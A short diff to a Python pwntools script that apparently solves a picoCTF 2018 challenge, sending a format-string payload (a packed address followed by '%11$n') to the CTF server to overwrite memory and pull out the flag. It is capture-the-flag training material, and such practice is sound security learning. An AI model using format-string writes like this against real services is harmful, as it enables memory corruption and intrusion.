@@ -39,7 +39,7 @@ else:
 	# finally we will pack the address and prepend to the %11$n to perform the attack
 	host, port = "2018shell.picoctf.com", 27114
 	p = remote(host, port)
-	p.sendline(p32(0x0804a04c) + "%11$n")
+	p.sendline(p32(0x804a04c) + "%11$n")
 	prompt = p.recvall()
 	
  	flag = re.findall(r"picoCTF{.*}", prompt)[0]
